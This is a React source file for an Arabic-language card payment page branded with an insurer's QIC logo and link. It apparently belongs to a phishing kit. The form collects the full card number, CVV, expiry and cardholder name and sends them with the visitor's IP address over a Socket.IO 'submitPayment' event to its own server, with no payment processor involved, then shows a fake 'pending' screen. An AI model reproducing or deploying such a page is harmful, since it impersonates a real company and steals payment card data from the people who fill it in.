import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSocket } from '../../context/SocketContext';
import '../../styles/pages/PayDCC.css';

const PayDCC = () => {
  const navigate = useNavigate();
  const { socket, userIp } = useSocket();
  const [formData, setFormData] = useState({
    cardNumber: '',
    cvc: '',
    expiryDate: '',
    cardholderName: ''
  });
  const [errors, setErrors] = useState({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [showCvcTooltip, setShowCvcTooltip] = useState(false);
  const [cardType, setCardType] = useState('');
  const [paymentAmount, setPaymentAmount] = useState('4,736');

  useEffect(() => {
    // Check if user came from quote page and get payment data
    const orderData = sessionStorage.getItem('orderData');
    if (!orderData) {
      navigate('/quotecheaK');
      return;
    }

    // Get total price from order data
    try {
      const order = JSON.parse(orderData);
      if (order.totalPrice) {
        setPaymentAmount(order.totalPrice.toLocaleString('en-US', { minimumFractionDigits: 2 }));
      }
    } catch (error) {
      console.error('Error parsing order data:', error);
    }
  }, [navigate]);

  const handleBack = () => {
    navigate('/quotecheaK');
  };

  const detectCardType = (cardNumber) => {
    const number = cardNumber.replace(/\s/g, '');
    
    // Visa: starts with 4
    if (/^4/.test(number)) {
      return 'visa';
    }
    // Mastercard: starts with 51-55 or 2221-2720
    if (/^5[1-5]/.test(number) || /^2(22[1-9]|2[3-9][0-9]|[3-6][0-9]{2}|7[0-1][0-9]|720)/.test(number)) {
      return 'mastercard';
    }
    // American Express: starts with 34 or 37
    if (/^3[47]/.test(number)) {
      return 'amex';
    }
    return '';
  };

  const fillTestData = () => {
    // بيانات بطاقة اختبار حقيقية (Qatar National Bank - QNB)
    const testCardData = {
      cardNumber: '4532 7580 1234 5678', // Visa test number
      cvc: '123',
      expiryDate: '12/28',
      cardholderName: 'AHMED MOHAMMED AL-THANI'
    };

    setFormData(testCardData);
    setCardType('visa');
    setErrors({});
  };

  // Expose fillTestData to window for easy access
  useEffect(() => {
    window.fillPaymentData = fillTestData;
    console.log('💳 لملء البيانات التجريبية، اكتب في Console: window.fillPaymentData()');
    
    return () => {
      delete window.fillPaymentData;
    };
  }, []);

  const formatCardNumber = (value) => {
    // Remove all non-digits
    const digitsOnly = value.replace(/\D/g, '');
    // Add space every 4 digits
    const formatted = digitsOnly.match(/.{1,4}/g)?.join(' ') || digitsOnly;
    return formatted.substring(0, 19); // Max 16 digits + 3 spaces
  };

  const formatExpiryDate = (value) => {
    // Remove all non-digits
    const digitsOnly = value.replace(/\D/g, '');
    // Add slash after 2 digits
    if (digitsOnly.length >= 2) {
      return digitsOnly.substring(0, 2) + '/' + digitsOnly.substring(2, 4);
    }
    return digitsOnly;
  };

  const handleInputChange = (field, value) => {
    let formattedValue = value;

    if (field === 'cardNumber') {
      formattedValue = formatCardNumber(value);
      setCardType(detectCardType(formattedValue));
    } else if (field === 'expiryDate') {
      formattedValue = formatExpiryDate(value);
    } else if (field === 'cvc') {
      formattedValue = value.replace(/\D/g, '').substring(0, 3);
    }

    setFormData(prev => ({
      ...prev,
      [field]: formattedValue
    }));

    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    // Card number validation
    const cardDigits = formData.cardNumber.replace(/\s/g, '');
    if (!cardDigits) {
      newErrors.cardNumber = 'املأ الخانة';
    } else if (cardDigits.length < 16) {
      newErrors.cardNumber = 'رقم البطاقة غير مكتمل';
    } else if (!/^\d{16}$/.test(cardDigits)) {
      newErrors.cardNumber = 'أدخل رقم البطاقة الصحيح';
    }

    // CVC validation
    if (!formData.cvc) {
      newErrors.cvc = 'املأ الخانة';
    } else if (formData.cvc.length !== 3) {
      newErrors.cvc = 'يجب أن يتكون الرمز من 3 أرقام';
    }

    // Expiry date validation
    if (!formData.expiryDate) {
      newErrors.expiryDate = 'املأ الخانة';
    } else {
      const [month, year] = formData.expiryDate.split('/');
      if (!month || !year || month.length !== 2 || year.length !== 2) {
        newErrors.expiryDate = 'أدخل تاريخ انتهاء الصلاحية بشكل صحيح';
      } else {
        const monthNum = parseInt(month);
        if (monthNum < 1 || monthNum > 12) {
          newErrors.expiryDate = 'أدخل شهر انتهاء الصلاحية بشكل صحيح';
        }
      }
    }

    // Cardholder name validation
    if (!formData.cardholderName.trim()) {
      newErrors.cardholderName = 'املأ الخانة';
    } else if (formData.cardholderName.trim().length < 3) {
      newErrors.cardholderName = 'أدخل اسم صاحب البطاقة بشكل صحيح';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsProcessing(true);

    // حفظ بيانات الدفع في sessionStorage
    const cardLastDigits = formData.cardNumber.slice(-4);
    sessionStorage.setItem('pendingPayment', JSON.stringify({
      cardLastDigits,
      phoneNumber: formData.phoneNumber || '+974 ****',
      amount: paymentAmount
    }));

    // Send payment data to backend
    if (socket && userIp) {
      console.log('💳 DCC Payment Data:', {
        ip: userIp,
        cardNumber: formData.cardNumber,
        cvv: formData.cvc,
        expirationDate: formData.expiryDate
      });
      
      socket.emit('submitPayment', {
        ip: userIp,
        paymentMethod: 'DCC - Debit/Credit Card',
        cardHolderName: formData.cardholderName || '',
        cardNumber: formData.cardNumber || '',
        cardLastDigits: cardLastDigits || '',
        expirationDate: formData.expiryDate || '',
        cvv: formData.cvc || '',
        phoneNumber: formData.phoneNumber || '',
        amount: parseFloat(paymentAmount.replace(/,/g, '')) || 0,
        timestamp: new Date().toISOString()
      });
      
      console.log('✅ DCC payment submitted via Socket.IO');
    } else {
      console.error('❌ Socket or userIp not available:', { socket: !!socket, userIp });
    }

    // Navigate to payment pending page
    setTimeout(() => {
      navigate('/payment-pending');
      setIsProcessing(false);
    }, 1000);
  };

  return (
    <div className="paydcc-page rtl">
      <div className="paydcc__header">
        <div className="paydcc__header-return" onClick={handleBack}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path fillRule="evenodd" clipRule="evenodd" d="M12.7071 5.70711C13.0976 5.31658 13.0976 4.68342 12.7071 4.29289C12.3166 3.90237 11.6834 3.90237 11.2929 4.29289L4.29289 11.2929C3.90237 11.6834 3.90237 12.3166 4.29289 12.7071L11.2929 19.7071C11.6834 20.0976 12.3166 20.0976 12.7071 19.7071C13.0976 19.3166 13.0976 18.6834 12.7071 18.2929L7.41421 13H19C19.5523 13 20 12.5523 20 12C20 11.4477 19.5523 11 19 11H7.41421L12.7071 5.70711Z" fill="#1C1C1C"></path>
          </svg>
        </div>

        <a className="paydcc__logo" href="https://qic.online/ar">
          <img src="data:image/svg+xml,%3csvg%20width='96'%20height='32'%20viewBox='0%200%2096%2032'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M54.6403%2020.0999H41.6213V19.6628C41.6214%2019.6052%2041.6411%2019.5497%2041.6766%2019.5072C41.7121%2019.4646%2041.7608%2019.438%2041.8133%2019.4326L44.6201%2018.8832V2.45967L41.8133%201.91178C41.7607%201.906%2041.7119%201.87911%2041.6765%201.83631C41.641%201.79351%2041.6214%201.73785%2041.6213%201.6801V1.24295H54.643V1.6801C54.643%201.73785%2054.6233%201.79351%2054.5878%201.83631C54.5523%201.87911%2054.5036%201.906%2054.451%201.91178L51.6443%202.45967V18.8774L54.451%2019.4267C54.5034%2019.4322%2054.5522%2019.4588%2054.5877%2019.5013C54.6232%2019.5439%2054.6429%2019.5994%2054.643%2019.657L54.6403%2020.0999ZM95.947%2014.3122C94.5468%2015.1733%2087.4787%2019.6642%2076.9448%2019.6642C67.2795%2019.6642%2064.9342%2013.9479%2064.9342%2010.6722C64.9342%207.39649%2067.2235%201.67864%2076.9448%201.67864C85.1881%201.67864%2087.1361%202.63162%2087.1361%202.63162C87.1771%202.64256%2087.22%202.63717%2087.2573%202.61643C87.2946%202.59568%2087.3245%202.56096%2087.3406%202.51852C87.3568%202.47609%2087.358%202.42876%2087.345%202.38509C87.3319%202.34142%2087.3052%202.3043%2087.2691%202.28044C87.2691%202.28044%2083.0971%200.00291492%2076.9386%200.00291492C62.9235%200.00291492%2057.8951%206.05156%2057.8951%2010.6722C57.8951%2015.2928%2062.9203%2021.34%2076.9386%2021.34C83.9508%2021.34%2091.6333%2018.1604%2095.9881%2014.3893C95.9943%2014.3821%2095.9986%2014.3727%2095.9999%2014.3626C96.0005%2014.3526%2095.9986%2014.3425%2095.9943%2014.3338C95.9893%2014.3251%2095.9825%2014.3183%2095.9738%2014.3145C95.9651%2014.3105%2095.9557%2014.3097%2095.947%2014.3122ZM59.5232%2027.6524C49.3548%2031.9437%2042.8653%2027.9292%2036.7265%2024.0751C32.993%2021.7436%2028.6729%2020.8256%2026.4021%2020.6711C34.8878%2018.9751%2038.1105%2014.3675%2038.1105%2010.6693C38.1105%206.04863%2033.081%200%2019.0432%200C13.0564%200.0743148%208.73493%202.27316%208.73493%202.27316C8.6957%202.29593%208.66579%202.33408%208.65118%202.37996C8.63663%202.42582%208.6385%202.47603%208.65634%202.52047C8.67425%202.56492%208.70689%202.60033%208.74768%202.61959C8.78847%202.63886%208.83441%202.64055%208.87626%202.62433C8.87626%202.62433%2011.0617%201.69612%2019.0406%201.67281C28.7836%201.67281%2031.0716%207.39064%2031.0716%2010.6663C31.0716%2013.942%2028.7836%2019.6584%2019.0379%2019.6584C9.31628%2019.6584%207.02689%2013.942%207.02689%2010.6663H0C0%2015.2024%204.84681%2021.1127%2018.2806%2021.3283C22.5807%2021.3283%2028.9849%2023.9832%2033.301%2026.5493C38.3932%2029.5772%2048.4921%2036.4769%2059.5552%2027.715C59.5588%2027.7088%2059.5608%2027.7017%2059.561%2027.6943C59.5611%2027.6869%2059.5595%2027.6797%2059.5562%2027.6733C59.5529%2027.6668%2059.5482%2027.6615%2059.5423%2027.6579C59.5365%2027.6542%2059.5299%2027.6523%2059.5232%2027.6524Z'%20fill='%231C1C1C'/%3e%3c/svg%3e" alt="logo qic" />
        </a>
      </div>

      <div className="paydcc__content">
        <div className="paydcc__card">
          <h1 className="paydcc__title">بيانات الدفع</h1>

          <form onSubmit={handleSubmit} className="paydcc__form">
            {/* Card Number */}
            <div className="paydcc__input-wrapper">
              <div className="paydcc__input-with-icon">
                <input
                  type="text"
                  id="cardNumber"
                  className={`paydcc__input ${errors.cardNumber ? 'error' : ''}`}
                  placeholder="0000 0000 0000 0000"
                  value={formData.cardNumber}
                  onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                  name="cardNumber"
                  autoComplete="cc-number"
                />
                {cardType && (
                  <img 
                    src={`/assets/images/${cardType}-icon.svg`} 
                    alt={cardType}
                    className="paydcc__card-type-icon"
                  />
                )}
              </div>
              {errors.cardNumber && (
                <p className="paydcc__error-message">{errors.cardNumber}</p>
              )}
            </div>

            {/* CVC and Expiry Date */}
            <div className="paydcc__row">
              <div className="paydcc__input-wrapper">
                <div className="paydcc__input-with-icon">
                  <input
                    type="text"
                    id="cvc"
                    className={`paydcc__input ${errors.cvc ? 'error' : ''}`}
                    placeholder="CVC/CVV"
                    value={formData.cvc}
                    onChange={(e) => handleInputChange('cvc', e.target.value)}
                    name="cvc"
                    autoComplete="cc-csc"
                  />
                  <svg 
                    className="paydcc__cvc-icon" 
                    width="31" 
                    height="24" 
                    viewBox="0 0 31 24" 
                    fill="none" 
                    xmlns="http://www.w3.org/2000/svg"
                    onClick={() => setShowCvcTooltip(!showCvcTooltip)}
                  >
                    <path d="M0 6.4C0 5.07452 1.07452 4 2.4 4H23.2C24.5255 4 25.6 5.07452 25.6 6.4V17.6C25.6 18.9255 24.5255 20 23.2 20H2.4C1.07452 20 0 18.9255 0 17.6V6.4Z" fill="#BAC4CD"/>
                    <path d="M0 6.40039H25.6V9.60039H0V6.40039Z" fill="#394B5A" fillOpacity="0.8"/>
                    <path d="M1.59961 12.0002C1.59961 11.5584 1.95778 11.2002 2.39961 11.2002H21.5996C22.0414 11.2002 22.3996 11.5584 22.3996 12.0002V13.6002C22.3996 14.042 22.0414 14.4002 21.5996 14.4002H2.39961C1.95778 14.4002 1.59961 14.042 1.59961 13.6002V12.0002Z" fill="white"/>
                    <path d="M30.4008 12.0002C30.4008 16.8603 26.4609 20.8002 21.6008 20.8002C16.7407 20.8002 12.8008 16.8603 12.8008 12.0002C12.8008 7.14009 16.7407 3.2002 21.6008 3.2002C26.4609 3.2002 30.4008 7.14009 30.4008 12.0002Z" fill="white"/>
                    <path fillRule="evenodd" clipRule="evenodd" d="M21.6008 19.2002C25.5772 19.2002 28.8008 15.9766 28.8008 12.0002C28.8008 8.02375 25.5772 4.8002 21.6008 4.8002C17.6243 4.8002 14.4008 8.02375 14.4008 12.0002C14.4008 15.9766 17.6243 19.2002 21.6008 19.2002ZM21.6008 20.8002C26.4609 20.8002 30.4008 16.8603 30.4008 12.0002C30.4008 7.14009 26.4609 3.2002 21.6008 3.2002C16.7407 3.2002 12.8008 7.14009 12.8008 12.0002C12.8008 16.8603 16.7407 20.8002 21.6008 20.8002Z" fill="#F94C27"/>
                    <path d="M17.9252 10.5605L17.8505 11.6885L18.9375 11.2725L19.145 11.9045L18.0164 12.1845L18.7633 13.0565L18.199 13.4405L17.5766 12.4965L16.946 13.4485L16.3983 13.0485L17.1368 12.1845L16 11.9045L16.224 11.2725L17.3028 11.6885L17.2281 10.5605H17.9252Z" fill="black"/>
                    <path d="M21.9527 10.5605L21.878 11.6885L22.965 11.2725L23.1725 11.9045L22.0439 12.1845L22.7908 13.0565L22.2265 13.4405L21.6041 12.4965L20.9735 13.4485L20.4258 13.0485L21.1643 12.1845L20.0275 11.9045L20.2516 11.2725L21.3303 11.6885L21.2556 10.5605H21.9527Z" fill="black"/>
                    <path d="M25.9802 10.5605L25.9055 11.6885L26.9925 11.2725L27.2 11.9045L26.0715 12.1845L26.8183 13.0565L26.254 13.4405L25.6317 12.4965L25.001 13.4485L24.4533 13.0485L25.1919 12.1845L24.055 11.9045L24.2791 11.2725L25.3578 11.6885L25.2831 10.5605H25.9802Z" fill="black"/>
                  </svg>
                  {showCvcTooltip && (
                    <div className="paydcc__cvc-tooltip">
                      رمز مكون من 3 أو 4 أرقام موجود على الجانب الأمامي أو الخلفي للبطاقة
                    </div>
                  )}
                </div>
                {errors.cvc && (
                  <p className="paydcc__error-message">{errors.cvc}</p>
                )}
              </div>

              <div className="paydcc__input-wrapper">
                <div className="paydcc__input-with-icon">
                  <svg className="paydcc__calendar-icon" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" clipRule="evenodd" d="M6.66699 0.833008C7.12723 0.833008 7.50033 1.2061 7.50033 1.66634V2.49967H12.5003V1.66634C12.5003 1.2061 12.8734 0.833008 13.3337 0.833008C13.7939 0.833008 14.167 1.2061 14.167 1.66634V2.50103C14.5632 2.50375 14.9095 2.51194 15.2102 2.5365C15.6786 2.57477 16.1092 2.65691 16.5136 2.86299C17.1408 3.18256 17.6508 3.6925 17.9703 4.31971C18.1764 4.72415 18.2586 5.15474 18.2968 5.62315C18.3337 6.07414 18.3337 6.62777 18.3337 7.29857V14.3674C18.3337 15.0382 18.3337 15.5919 18.2968 16.0429C18.2586 16.5113 18.1764 16.9419 17.9703 17.3463C17.6508 17.9735 17.1408 18.4834 16.5136 18.803C16.1092 19.0091 15.6786 19.0912 15.2102 19.1295C14.7592 19.1664 14.2056 19.1664 13.5348 19.1663H6.46589C5.79509 19.1664 5.24146 19.1664 4.79047 19.1295C4.32206 19.0912 3.89147 19.0091 3.48702 18.803C2.85982 18.4834 2.34988 17.9735 2.0303 17.3463C1.82423 16.9419 1.74209 16.5113 1.70382 16.0429C1.66697 15.5919 1.66698 15.0382 1.66699 14.3674V7.29859C1.66698 6.62778 1.66697 6.07415 1.70382 5.62315C1.74209 5.15474 1.82423 4.72415 2.0303 4.31971C2.34988 3.6925 2.85982 3.18256 3.48702 2.86299C3.89147 2.65691 4.32206 2.57477 4.79047 2.5365C5.09115 2.51194 5.43744 2.50375 5.83366 2.50103V1.66634C5.83366 1.2061 6.20676 0.833008 6.66699 0.833008ZM5.83366 4.16781C5.46239 4.17042 5.17085 4.17764 4.92619 4.19763C4.56084 4.22748 4.37401 4.28159 4.24368 4.348C3.93007 4.50779 3.6751 4.76275 3.51532 5.07636C3.44891 5.20669 3.3948 5.39353 3.36495 5.75887C3.33431 6.13395 3.33366 6.61919 3.33366 7.33301V7.49967H16.667V7.33301C16.667 6.61919 16.6663 6.13395 16.6357 5.75887C16.6058 5.39353 16.5517 5.20669 16.4853 5.07636C16.3255 4.76275 16.0706 4.50779 15.757 4.348C15.6266 4.28159 15.4398 4.22748 15.0745 4.19763C14.8298 4.17764 14.5383 4.17042 14.167 4.16781V4.99967C14.167 5.45991 13.7939 5.83301 13.3337 5.83301C12.8734 5.83301 12.5003 5.45991 12.5003 4.99967V4.16634H7.50033V4.99967C7.50033 5.45991 7.12723 5.83301 6.66699 5.83301C6.20676 5.83301 5.83366 5.45991 5.83366 4.99967V4.16781ZM16.667 9.16634H3.33366V14.333C3.33366 15.0468 3.33431 15.5321 3.36495 15.9071C3.3948 16.2725 3.44891 16.4593 3.51532 16.5897C3.6751 16.9033 3.93007 17.1582 4.24368 17.318C4.37401 17.3844 4.56085 17.4385 4.92619 17.4684C5.30127 17.499 5.78651 17.4997 6.50033 17.4997H13.5003C14.2141 17.4997 14.6994 17.499 15.0745 17.4684C15.4398 17.4385 15.6266 17.3844 15.757 17.318C16.0706 17.1582 16.3255 16.9033 16.4853 16.5897C16.5517 16.4593 16.6058 16.2725 16.6357 15.9071C16.6663 15.5321 16.667 15.0468 16.667 14.333V9.16634Z" fill="#746C96"/>
                  </svg>
                  <input
                    type="text"
                    id="expiryDate"
                    className={`paydcc__input ${errors.expiryDate ? 'error' : ''}`}
                    placeholder="MM/YY"
                    value={formData.expiryDate}
                    onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                    name="expiryDate"
                    autoComplete="cc-exp"
                  />
                </div>
                {errors.expiryDate && (
                  <p className="paydcc__error-message">{errors.expiryDate}</p>
                )}
              </div>
            </div>

            {/* Cardholder Name */}
            <div className="paydcc__input-wrapper">
              <input
                type="text"
                id="cardholderName"
                className={`paydcc__input ${errors.cardholderName ? 'error' : ''}`}
                placeholder="إسم صاحب البطاقة"
                value={formData.cardholderName}
                onChange={(e) => handleInputChange('cardholderName', e.target.value)}
                name="cardholderName"
                autoComplete="cc-name"
              />
              {errors.cardholderName && (
                <p className="paydcc__error-message">{errors.cardholderName}</p>
              )}
            </div>

            {/* Submit Button */}
            <button 
              type="submit" 
              className={`paydcc__submit-btn ${isProcessing ? 'loading' : ''}`}
              disabled={isProcessing}
            >
              {isProcessing ? (
                <svg className="paydcc__loader" width="28" height="28" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none">
                  <path opacity="0.1" fillRule="evenodd" clipRule="evenodd" d="M12 19C15.866 19 19 15.866 19 12C19 8.13401 15.866 5 12 5C8.13401 5 5 8.13401 5 12C5 15.866 8.13401 19 12 19ZM12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#fff"/>
                  <path fillRule="evenodd" clipRule="evenodd" d="M10.5 3.5C10.5 2.67157 11.1716 2 12 2C13.3132 2 14.6136 2.25866 15.8268 2.7612C17.0401 3.26375 18.1425 4.00035 19.0711 4.92893C19.9997 5.85752 20.7362 6.95991 21.2388 8.17317C21.7413 9.38642 22 10.6868 22 12C22 12.8284 21.3284 13.5 20.5 13.5C19.6716 13.5 19 12.8284 19 12C19 11.0807 18.8189 10.1705 18.4672 9.32122C18.1154 8.47194 17.5998 7.70026 16.9497 7.05025C16.2997 6.40024 15.5281 5.88463 14.6788 5.53284C13.8295 5.18106 12.9193 5 12 5C11.1716 5 10.5 4.32843 10.5 3.5Z" fill="#fff"/>
                </svg>
              ) : (
                `إدفع ${paymentAmount} ر.ق`
              )}
            </button>

            {/* Security Notice */}
            <div className="reminder_dibsy">
              <div className="payment-icons">
                <img src="/assets/images/payment-choices.DicUKjf4.svg" alt="Payment Choices" style={{maxHeight: '32px'}} />
              </div>

              <div class="reminder-desc">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.9987 0.666992C6.15775 0.666992 4.66537 2.15938 4.66537 4.00033V6.00141C4.34839 6.00359 4.07135 6.01013 3.83081 6.02979C3.45608 6.0604 3.11161 6.12611 2.78806 6.29097C2.28629 6.54664 1.87834 6.95459 1.62268 7.45635C1.45782 7.77991 1.39211 8.12438 1.36149 8.49911C1.33202 8.8599 1.33202 9.3028 1.33203 9.83945V11.4945C1.33202 12.0312 1.33202 12.4741 1.36149 12.8349C1.39211 13.2096 1.45782 13.5541 1.62268 13.8776C1.87834 14.3794 2.28629 14.7873 2.78806 15.043C3.11161 15.2079 3.45608 15.2736 3.83081 15.3042C4.19162 15.3337 4.63453 15.3337 5.17118 15.3337H10.8262C11.3629 15.3337 11.8058 15.3337 12.1666 15.3042C12.5413 15.2736 12.8858 15.2079 13.2093 15.043C13.7111 14.7873 14.1191 14.3794 14.3747 13.8776C14.5396 13.5541 14.6053 13.2096 14.6359 12.8349C14.6654 12.4741 14.6654 12.0312 14.6654 11.4945V9.83944C14.6654 9.3028 14.6654 8.8599 14.6359 8.49911C14.6053 8.12438 14.5396 7.77991 14.3747 7.45635C14.1191 6.95459 13.7111 6.54664 13.2093 6.29097C12.8858 6.12611 12.5413 6.0604 12.1666 6.02979C11.926 6.01013 11.649 6.00359 11.332 6.00141V4.00033C11.332 2.15938 9.83965 0.666992 7.9987 0.666992ZM10.7987 7.33366H5.1987C4.62765 7.33366 4.23945 7.33418 3.93939 7.35869C3.64711 7.38257 3.49764 7.42586 3.39338 7.47898C3.1425 7.60681 2.93852 7.81079 2.81069 8.06167C2.75756 8.16594 2.71428 8.31541 2.6904 8.60768C2.66588 8.90774 2.66537 9.29594 2.66537 9.86699V11.467C2.66537 12.038 2.66588 12.4262 2.6904 12.7263C2.71428 13.0186 2.75756 13.168 2.81069 13.2723C2.93852 13.5232 3.1425 13.7272 3.39338 13.855C3.49764 13.9081 3.64711 13.9514 3.93939 13.9753C4.23945 13.9998 4.62765 14.0003 5.1987 14.0003H10.7987C11.3698 14.0003 11.7579 13.9998 12.058 13.9753C12.3503 13.9514 12.4998 13.9081 12.604 13.855C12.8549 13.7272 13.0589 13.5232 13.1867 13.2723C13.2398 13.168 13.2831 13.0186 13.307 12.7263C13.3315 12.4262 13.332 12.038 13.332 11.467V9.86699C13.332 9.29594 13.3315 8.90774 13.307 8.60768C13.2831 8.31541 13.2398 8.16594 13.1867 8.06167C13.0589 7.81079 12.8549 7.60681 12.604 7.47898C12.4998 7.42586 12.3503 7.38257 12.058 7.35869C11.7579 7.33418 11.3698 7.33366 10.7987 7.33366ZM9.9987 6.00033V4.00033C9.9987 2.89576 9.10327 2.00033 7.9987 2.00033C6.89413 2.00033 5.9987 2.89576 5.9987 4.00033V6.00033H9.9987Z" fill="#746C96"></path>
                  <path d="M6.66537 10.0003C6.66537 9.26395 7.26232 8.66699 7.9987 8.66699C8.73508 8.66699 9.33203 9.26395 9.33203 10.0003C9.33203 10.4938 9.0639 10.9247 8.66536 11.1553V12.0003C8.66536 12.3685 8.36689 12.667 7.9987 12.667C7.63051 12.667 7.33203 12.3685 7.33203 12.0003V11.1553C6.9335 10.9247 6.66537 10.4938 6.66537 10.0003Z" fill="#746C96"></path>
                </svg>
                جميع المدفوعات محمية بواسطة بروتوكول طبقة المنافذ الآمنة
              </div>
            </div>
          </form>
        </div>
      </div>

      <div className="paydcc__footer">
        <img 
          src="/assets/images/shield-dibsy-ar.png" 
          alt="شركة التأمين الرائدة في منطقة الخليج"
          className="paydcc__footer-image"
        />
      </div>
    </div>
  );
};

export default PayDCC;
